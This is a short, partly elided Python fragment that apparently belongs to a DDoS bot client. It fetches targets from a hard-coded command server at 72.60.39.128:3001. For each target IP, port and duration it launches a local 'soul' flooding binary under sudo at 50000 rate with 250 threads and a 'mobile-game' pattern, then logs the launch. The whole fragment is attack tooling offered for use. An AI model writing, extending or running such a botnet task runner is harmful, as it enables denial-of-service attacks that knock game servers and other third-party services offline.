...
BASE_URL = 'http://72.60.39.128:3001'
SOUL_PATH = '/anonymousmadebysoulcravkks/'
DONE_PATH = '/anonymousmadebysoulcravkks/done'
    ...
    if ip and port and time_val:
        ...
        if key not in active_tasks:
            ...
            try:
                ...
                process = subprocess.Popen(['sudo', './soul', ip, str(port), str(time_val), 
                           '--rate', '50000',
                           '--size', '64',
                           '--threads', '250',
                           '--pattern', 'mobile-game',
               ...
               print(f"[+] Launched binary: sudo ./soul {ip} {port} {time_val} --rate 50000 --size 64 --threads 250 --pattern mobile-game --mobile-network 5g --player-count 10 --anti-cheat-simulation (PID: {process.pid})")
